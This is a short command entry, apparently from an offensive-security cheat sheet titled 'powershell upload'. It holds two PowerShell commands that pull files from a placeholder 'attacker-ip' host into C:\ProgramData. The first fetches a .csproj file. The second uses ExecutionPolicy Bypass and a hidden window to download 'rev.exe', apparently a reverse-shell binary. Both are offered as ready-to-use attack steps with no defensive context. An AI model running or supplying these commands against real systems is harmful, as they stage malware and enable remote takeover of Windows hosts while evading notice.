---
id: 69492663-848a-445e-a04d-58e24ea6ff89
name: powershell upload
type: command
executor: bash
data: 'powershell Invoke-WebRequest "http://attacker-ip:81/x41.csproj" -OutFile "C:\ProgramData\x41.csproj"

  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle
  Hidden -Command "(New-Object System.Net.WebClient).DownloadFile(''http://attacker-ip/rev.exe'',
  ''C:\ProgramData\'')"

  '
output: null
created_at: '2020-07-14T18:15:05.488526+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# powershell upload

```bash
powershell Invoke-WebRequest "http://attacker-ip:81/x41.csproj" -OutFile "C:\ProgramData\x41.csproj"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://attacker-ip/rev.exe', 'C:\ProgramData\')"

```
